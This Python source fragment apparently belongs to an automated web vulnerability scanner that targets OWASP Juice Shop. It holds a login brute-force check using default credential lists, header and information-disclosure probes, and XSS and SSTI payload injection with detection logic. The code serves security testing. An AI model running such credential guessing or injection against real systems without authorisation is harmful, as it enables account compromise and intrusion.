            # FIX BF1: Juice Shop (and most modern apps) use JSON POST bodies,
            # not form-encoded params. Also auto-detect the login endpoint from
            # known patterns rather than blasting the scan root URL.
            import re as _bfre
            _target_str = str(target.get("url", target) if isinstance(target, dict) else target)
            _base = _target_str.split("#")[0].rstrip("/")

            # Common login endpoint candidates — try them in order
            LOGIN_CANDIDATES = [
                f"{_base}/rest/user/login",          # Juice Shop
                f"{_base}/api/login",
                f"{_base}/api/users/login",
                f"{_base}/api/auth/login",
                f"{_base}/login",
                f"{_base}/signin",
                f"{_base}/auth/login",
                _target_str,                          # fall back to scan target
            ]

            # Credential sets — load from SecLists if available, else use built-ins
            # data/wordlists/credentials.json is built by core/build_payload_db.py
            import json as _bfjson
            from pathlib import Path as _bfPath
            _cred_file = _bfPath("data/wordlists/credentials.json")
            _builtin_users     = ["admin", "administrator", "root", "test", "user", "info"]
            _builtin_passwords = ["wrongpass_test", "admin", "password", "123456", "letmein"]

            if _cred_file.exists():
                try:
                    _cred_pairs = _bfjson.loads(_cred_file.read_text(encoding="utf-8"))[:50]
                    JSON_PARAMS = [
                        {"email": c.get("email", f"{c['username']}@example.com"),
                         "password": c["password"]}
                        for c in _cred_pairs[:25]
                    ]
                    FORM_PARAMS = [
                        {"username": c["username"], "password": c["password"]}
                        for c in _cred_pairs[:25]
                    ]
                except Exception as _bfe:
                    import logging as _bflog
                    _bflog.getLogger(__name__).debug(f"[brute_force] credential load error: {_bfe}")
                    JSON_PARAMS = [
                        {"email": f"{u}@juice-sh.op", "password": p}
                        for u in _builtin_users for p in _builtin_passwords
                    ]
                    FORM_PARAMS = [
                        {"username": u, "password": p}
                        for u in _builtin_users for p in _builtin_passwords
                    ]
            else:
                # Built-in fallback — always works without datasets
                JSON_PARAMS = [
                    {"email": "admin@juice-sh.op", "password": "wrongpass_test"},
                    {"email": "admin@test.com", "password": "wrongpass_test"},
                    {"username": "admin", "password": "wrongpass_test"},
                ]
                FORM_PARAMS = [
                    {"username": "admin", "password": "wrongpass_test"},
                    {"email": "admin@test.com", "password": "wrongpass_test"},
                ]

            for login_url in LOGIN_CANDIDATES:
                for creds, is_json in [(j, True) for j in JSON_PARAMS] + [(f, False) for f in FORM_PARAMS]:
                    try:
                        blocked_count = 0
                        last_status = None
                        for _ in range(6):
                            if is_json:
                                r = session.post(
                                    login_url,
                                    json=creds,
                                    headers={"Content-Type": "application/json"},
                                    timeout=10,
                                )
                            else:
                                r = session.post(login_url, data=creds, timeout=10)
                            last_status = r.status_code
                            # 429 = rate limit, "locked" / "too many" = lockout
                            if r.status_code == 429 or "locked" in r.text.lower() or "too many" in r.text.lower():
                                blocked_count += 1
                        # Endpoint accepted 6 consecutive bad logins → no protection
                        if blocked_count == 0 and last_status not in [404, 405]:
                            return {
                                "status": "SUCCESS",
                                "payload": "6 rapid login attempts",
                                "evidence": {
                                    "type": "No Brute Force Protection",
                                    "endpoint": login_url,
                                    "parameter": "email/password",
                                    "vulnerable_url": login_url,
                                    "detail": (
                                        f"6 consecutive failed logins to {login_url} "
                                        f"accepted without rate limiting or lockout "
                                        f"(final status: {last_status})"
                                    ),
                                }
                            }
                    except Exception as _e:
                        continue
            return {"status": "FAILED", "payload": "brute_force-safe"}

        if vuln == "information_disclosure":
            issues = []
            try:
                resp = session.get(target, timeout=10)
                body = resp.text
                hdrs = resp.headers

                # Check response headers for version leakage
                leaky_headers = ["Server", "X-Powered-By", "X-AspNet-Version", "X-Runtime", "Via"]
                for hdr in leaky_headers:
                    val = hdrs.get(hdr, "")
                    if val:
                        issues.append(f"Header '{hdr}' discloses: {val}")

                # Check body for stack traces / debug info
                trace_patterns = [
                    "Traceback (most recent call last)", "at System.",
                    "NullPointerException", "mysqli_error", "pg_query",
                    "debug_backtrace", "SQLSTATE", "Warning: mysql_",
                    "<b>Fatal error</b>"
                ]
                for pattern in trace_patterns:
                    if pattern in body:
                        issues.append(f"Debug/error info leaked: {pattern[:60]}")

                # Check for internal IPs
                import re as _re2
                ip_matches = _re2.findall(r'\b(10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)\b', body)
                if ip_matches:
                    issues.append(f"Internal IP addresses in response: {ip_matches[:3]}")

                if issues:
                    return {
                        "status": "SUCCESS",
                        "payload": "info-disclosure-probe",
                        "evidence": {
                            "type": "Information Disclosure",
                            "issues": issues
                        }
                    }
            except Exception as _ide:
                logger.debug(f"[executor][info_disclosure] Probe error: {_ide}")
            return {"status": "FAILED", "payload": "info-disclosure-safe"}

        if vuln == "security_headers":
            missing_headers = []
            try:
                resp = session.get(target, timeout=10)
                hdrs = resp.headers

                # Check required security headers
                REQUIRED = {
                    "Content-Security-Policy": "CSP not set",
                    "X-Frame-Options": "Clickjacking protection missing",
                    "X-Content-Type-Options": "MIME-sniffing protection missing",
                    "Strict-Transport-Security": "HSTS not set",
                    "Referrer-Policy": "Referrer-Policy not set",
                    "Permissions-Policy": "Permissions-Policy not set",
                }
                for hdr, desc in REQUIRED.items():
                    if hdr not in hdrs:
                        missing_headers.append(desc)

                # Check for insecure cookies (no Secure / HttpOnly)
                cookies_raw = hdrs.get("Set-Cookie", "")
                if cookies_raw:
                    if "secure" not in cookies_raw.lower():
                        missing_headers.append("Cookie missing 'Secure' flag")
                    if "httponly" not in cookies_raw.lower():
                        missing_headers.append("Cookie missing 'HttpOnly' flag")

                if missing_headers:
                    return {
                        "status": "SUCCESS",
                        "payload": "security-headers-probe",
                        "evidence": {
                            "type": "Missing Security Headers",
                            "missing": missing_headers
                        }
                    }
            except Exception as _she:
                logger.debug(f"[executor][security_headers] Probe error: {_she}")
            return {"status": "FAILED", "payload": "security-headers-safe"}

        # Generic Execution (XSS, RF, etc)
        # FIX E1: Assign 'p' from payload_entry here — it was undefined in this scope before
        p = _orig  # _orig is always set at the top of execute_payload

        # Use dynamic parameter discovery instead of hardcoded "test"
        inject_param = payload_entry.get("param", "test") if isinstance(payload_entry, dict) else "test"
        if isinstance(payload_entry, dict) and "params" in payload_entry:
            # Use discovered parameters from recon
            inject_param = payload_entry["params"][0] if payload_entry["params"] else "test"

        # Try multiple common parameters if injection fails
        fallback_params = ["q", "search", "query", "id", "page", "name", "value", "input"]

        params_to_try = [inject_param] + [fp for fp in fallback_params if fp != inject_param]

        response = None
        used_param = inject_param
        last_error = None

        # FIX4: Detect REST/JSON API endpoints and send payloads in request body.
        # Juice Shop and most modern bug bounty targets use JSON APIs — injecting into
        # query strings hits nothing. For /api/* and /rest/* endpoints we POST JSON.
        _target_lower = str(target).lower()
        _is_json_api = any(kw in _target_lower for kw in [
            '/api/', '/rest/', '/v1/', '/v2/', '/v3/', '/graphql',
            '/json', '/rpc', '/service',
        ])

        for param in params_to_try[:3]:  # Try up to 3 parameters
            try:
                if _is_json_api:
                    # Try POST with JSON body first (REST API pattern)
                    try:
                        response = session.post(
                            target,
                            json={param: p},
                            headers={"Content-Type": "application/json"},
                            timeout=10
                        )
                        if response.status_code not in (405, 404):
                            used_param = param
                            break
                    except Exception as _e:
                        pass
                # Fallback: GET with query string
                response = session.get(
                    target,
                    params={param: p},
                    timeout=10
                )
                if response.status_code != 400:
                    used_param = param
                    break
            except Exception as e:
                last_error = e
                continue
        
        # CRITICAL FIX: Handle case where all requests failed
        if response is None:
            logger.warning(f"[{vuln}] All request attempts failed for payload")
            result["status"] = "ERROR"
            result["evidence"] = f"All request attempts failed: {last_error}"
            return result
        # P-1 FIX: stash response so anomaly/feature callers reuse it instead
        # of firing a second identical HTTP request on the hot path.
        result["_response"] = response

        logger.info(
            f"[{vuln}] Payload sent | Status {response.status_code}"
        )

        if is_blocked(response):
            rate_controller.on_block(logger, response=response)
            result["status"] = "BLOCKED"
            result["evidence"] = "WAF / rate limit detected"
            return result
            
        if not auth_still_valid(response): 
             logger.error("[auth] Session expired or invalid — stopping authenticated tests")
             result["status"] = "BLOCKED"
             result["evidence"] = "Authentication lost"
             return result
        
        # ML Analysis Integration - analyze response for vulnerability detection
        ml_result = ml_analyze_response(response, vuln, p, target)
        if ml_result.get("ml_used"):
            _conf = ml_result.get("confidence", 0)
            if ml_result.get("is_vulnerable") and _conf >= 0.7:
                logger.info(f"[{vuln}] ML detected vulnerability with confidence {_conf:.2f}")
            elif _conf > 0:
                logger.debug(f"[{vuln}] ML candidate with confidence {_conf:.2f} (below 0.70 threshold — not flagged)")
            result["ml_analysis"] = ml_result

        # Research: build ML feature vector for self-learning (additive only — no behaviour change)
        if _FEATURE_VECTOR_AVAILABLE and _build_feature_vector is not None:
            try:
                _fv = _build_feature_vector(
                    url=str(target),
                    method="GET",
                    payload=p,
                    response=response,
                    response_time_ms=0.0,  # timing not available here; use 0 as sentinel
                )
                logger.debug(
                    f"[features] {vuln} vector: status={_fv.status_code} "
                    f"entropy={_fv.body_entropy:.2f} param={used_param}"
                )
            except Exception as _e:
                pass  # feature extraction is non-critical
        
        # Build vulnerable URL for reporting
        from urllib.parse import urlencode, urljoin, urlparse
        vulnerable_url = f"{target}?{urlencode({used_param: p})}"
        
        if vuln == "xss":
            # FIX XSS-FP: JS bundle files (.js, .mjs, .ts, .jsx, .tsx) contain
            # onerror=, javascript:, and event handler patterns in their *source
            # code*. Running XSS reflection analysis on these produces 100% false
            # positives — the payload is never injected into the JS, and the
            # patterns come from the app's own code, not from our payload.
            _target_lower = str(target).lower().split("?")[0]
            _is_js_bundle = any(
                _target_lower.endswith(ext)
                for ext in (".js", ".mjs", ".ts", ".jsx", ".tsx")
            )
            if _is_js_bundle:
                logger.debug(
                    f"[xss] Skipping reflection analysis on JS bundle: {target}"
                )
                result["status"] = "SKIPPED"
                result["evidence"] = "JS bundle — XSS reflection not applicable"
                return result

            # Context-aware XSS detection
            # 1. First check if our exact payload was reflected unescaped
            body = response.text

            # Direct payload reflection check
            _xss_confirmed = False
            _xss_context   = "unknown"

            # Check for unescaped angle brackets / event handlers in response
            if p in body:
                _xss_context = _detect_xss_context(body, p)
                # In JS context, reflection is always dangerous
                # In HTML/attr context, check for unescaped chars
                if _xss_context in ("javascript", "html_tag"):
                    _xss_confirmed = True
                elif _xss_context in ("html_body", "attribute"):
                    # Only confirm if dangerous chars aren't HTML-encoded
                    _escaped = (
                        "&lt;" in body[max(0, body.find(p)-20):body.find(p)+len(p)+20] or
                        "&gt;" in body[max(0, body.find(p)-20):body.find(p)+len(p)+20] or
                        "&#" in body[max(0, body.find(p)-20):body.find(p)+len(p)+20]
                    )
                    _xss_confirmed = not _escaped
                else:
                    _xss_confirmed = True

            # 2. Fallback: use the existing reflection analyser
            if not _xss_confirmed:
                findings = analyze_reflection(body)
                if findings and is_potential_xss(findings):
                    _xss_confirmed = True
                    _xss_context = findings[0].get("context", "html_body") if findings else "html_body"

            if _xss_confirmed:
                result["status"] = "SUCCESS"
                result["evidence"] = {
                    "type": "XSS",
                    "context": _xss_context,
                    "endpoint": target,
                    "parameter": used_param,
                    "payload": p,
                    "vulnerable_url": vulnerable_url,
                    "how_to_reproduce": (
                        f"1. Navigate to: {target}\n"
                        f"2. Inject payload into '{used_param}' parameter\n"
                        f"3. Payload: {p}\n"
                        f"4. Context: {_xss_context}\n"
                        f"5. Full URL: {vulnerable_url}"
                    ),
                }
                return result

        # FIX SSTI: SSTI is confirmed by the *evaluated result* appearing in the
        # response, NOT by the literal payload being reflected.
        # - {{7*7}}  → look for "49"  (Jinja2 / Twig / Pebble)
        # - ${7*7}   → look for "49"  (FreeMarker / Thymeleaf)
        # - #{7*7}   → look for "49"  (Ruby ERB / Slim)
        # - <%= 7*7%>→ look for "49"  (ERB / EJS)
        # - {{7**7}}  → look for "823543" (Jinja2 exponentiation probe)
        # Reflected payload (not evaluated) means the server is NOT vulnerable.
        # A plain string match on the payload would produce the exact opposite result.
        if vuln == "ssti":
            body = response.text
            # Map each known payload to its expected evaluated output.
            # Payloads NOT in this map are skipped — we never assume "49" matches
            # an unknown payload to avoid false positives on pages containing "49".
            SSTI_EVAL_MAP = {
                "{{7*7}}":   ["49"],
                "${7*7}":    ["49"],
                "<%= 7*7 %>":["49"],
                "#{7*7}":    ["49"],
                "{{7**7}}":  ["823543"],
                "${7**7}":   ["823543"],
                # Engine-error probes — malformed syntax often leaks engine name
                "{{":        ["TemplateSyntaxError", "Jinja2", "Twig", "Pebble", "Velocity"],
                "${":        ["FreeMarker", "TemplateSyntaxError", "expression", "EL error"],
            }
            # Only check payloads whose expected output is known; skip unknown ones
            expected_outputs = SSTI_EVAL_MAP.get(p, [])
            if not expected_outputs:
                # Unknown payload — cannot safely determine expected output, skip
                result["status"] = "FAILED"
                return result
            for expected in expected_outputs:
                if expected in body:
                    result["status"] = "SUCCESS"
                    result["evidence"] = {
                        "type": "Server-Side Template Injection",
                        "payload": p,
                        "expected_output": expected,
                        "endpoint": target,
                        "parameter": used_param,
                        "vulnerable_url": vulnerable_url,
                        "how_to_reproduce": (
                            f"1. Navigate to: {target}\n"
                            f"2. Inject payload `{p}` into '{used_param}' parameter\n"
                            f"3. Server evaluated expression: response contains '{expected}'\n"
                            f"4. Full URL: {vulnerable_url}"
                        ),
                    }
                    return result
            # Payload reflected verbatim → engine did NOT evaluate it → not vulnerable
            result["status"] = "FAILED"
            return result

        # C-3 FIX: use _orig (safe string, always set at top of function) instead of
        # payload_entry["original"] which crashes when payload_entry is a plain str
        if _orig in response.text:
            result["status"] = "SUCCESS"
            result["evidence"] = {
                "type": f"{vuln.upper()} Payload Reflected",
                "message": "Payload reflected in response",
                "endpoint": target,
                "parameter": used_param,
                "vulnerable_url": vulnerable_url,
                "how_to_reproduce": f"1. Navigate to: {target}\n2. Inject payload into '{used_param}' parameter\n3. Payload: {p}\n4. Full URL: {vulnerable_url}"
            }
        else:
            result["status"] = "FAILED"

    except Exception as e:
        logger.error(f"[{vuln}] Execution error: {e}")
        result["status"] = "ERROR"
        result["evidence"] = str(e)

    return result

